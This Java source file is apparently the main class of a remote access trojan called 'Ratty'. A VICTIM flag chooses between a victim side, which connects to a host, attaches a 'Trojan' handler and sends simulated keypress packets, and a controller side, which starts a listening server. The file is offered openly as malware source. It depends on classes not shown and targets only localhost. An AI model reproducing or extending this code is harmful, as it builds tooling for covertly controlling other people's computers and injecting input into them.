package de.sogomn.rat;

import java.awt.event.KeyEvent;


public final class Ratty {
	
	public static final boolean VICTIM = false;
	
	private Ratty() {
		//...
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveClient newClient = new ActiveClient(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			connectToHost(address, port);
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, true));
		newClient.sendPacket(new KeyEventPacket(KeyEvent.VK_W, false));
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		
		server.start();
	}
	
	public static void main(final String[] args) {
		if (VICTIM) {
			connectToHost("localhost", 23456);
			
			System.out.println("Client started");
		} else {
			startServer(23456);
			
			System.out.println("Server started");
		}
	}
	
}
